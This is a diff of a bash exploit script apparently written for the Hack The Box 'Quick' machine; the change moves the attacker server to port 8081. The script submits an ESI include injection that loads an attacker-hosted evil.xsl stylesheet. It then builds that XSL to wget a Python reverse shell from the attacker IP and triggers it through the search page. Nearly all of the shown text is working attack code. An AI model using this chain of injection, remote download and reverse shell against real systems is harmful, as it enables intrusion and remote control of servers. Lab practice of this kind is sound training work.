@@ -21,12 +21,12 @@ tkt=$(curl 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" | g
 echo "Got ticket number ${tkt}"
 
 # Create the ticket with the esigate exploit
-curl --silent 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" --data "title=title&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Flocalhost%3A9001%2Findex.php%22+stylesheet%3D%22http%3A%2F%2F${htbip}%2Fquick%2Fevil.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-${tkt}"
+curl --silent 'http://quick.htb:9001/ticket.php' -H "Cookie: PHPSESSID=${sess}" --data "title=title&msg=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Flocalhost%3A9001%2Findex.php%22+stylesheet%3D%22http%3A%2F%2F${htbip}:8081%2Fhtb%2Fquick%2Fevil.xsl%22%3E%0D%0A%3C%2Fesi%3Ainclude%3E&id=TKT-${tkt}"
 echo "Ticket with esigate exploit created"
 
 # Download the python rev shell
 cat part1.xsl > evil.xsl
-echo "<xsl:variable name=\"cmd\"><![CDATA[wget http://${htbip}/quick/rev-shell.py]]></xsl:variable>" >> evil.xsl
+echo "<xsl:variable name=\"cmd\"><![CDATA[wget http://${htbip}:8081/htb/quick/rev-shell.py]]></xsl:variable>" >> evil.xsl
 cat part2.xsl >> evil.xsl
 curl --silent "http://quick.htb:9001/search.php?search=${tkt}" -H "Cookie: PHPSESSID=${sess}"
 echo "Python reverse shell downloaded"
